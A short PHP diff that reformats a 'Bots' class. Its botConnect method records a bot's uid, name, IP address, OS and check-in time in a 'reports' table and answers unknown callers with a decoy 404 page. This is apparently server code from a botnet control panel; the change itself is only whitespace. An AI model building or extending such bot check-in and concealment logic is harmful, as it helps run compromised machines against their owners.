@@ -9,13 +9,10 @@ Class Bots
       $this->db = $DB_con;
     }
 
-
-
-
-  	public function botConnect($uid, $name, $ip, $os, $time) 
-   	{  
-    try
-      {
+    public function botConnect($uid, $name, $ip, $os, $time) 
+    {  
+           try
+	     {
  	
 		$query = $this->db->prepare("SELECT * FROM reports WHERE `uid` = :uid ");
 		$query->execute(array(':uid'=>$uid));
@@ -32,11 +29,8 @@ Class Bots
 		$append->execute(array(':name'=>$name,':ip'=>$ip,':os'=>$os,':uid'=>$uid, ':time'=>$time));
 		}else{
 		echo '<h1>404</h1>';
-		}
-
-      }
-      catch(PDOException $e)
-      {
+	     }
+      }catch(PDOException $e){
         echo $e->getMessage();
       }    
    }
